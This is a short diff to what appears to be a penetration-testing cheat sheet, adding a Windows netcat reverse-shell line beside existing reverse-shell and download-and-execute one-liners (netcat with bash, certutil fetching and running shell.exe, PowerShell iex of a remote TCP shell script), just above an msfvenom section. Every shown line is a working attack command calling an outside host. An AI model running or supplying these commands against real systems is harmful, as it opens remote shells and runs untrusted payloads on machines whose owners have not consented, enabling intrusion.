@@ -483,6 +483,7 @@ nc -e /bin/bash 192.168.119.1136 4444
 certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe
 powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')"
 powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1')|iex"
+*using nc.exe* nc.exe -e cmd.exe 192.168.49.200 3000
 ```
 # MSFVENOM 
 ```bash
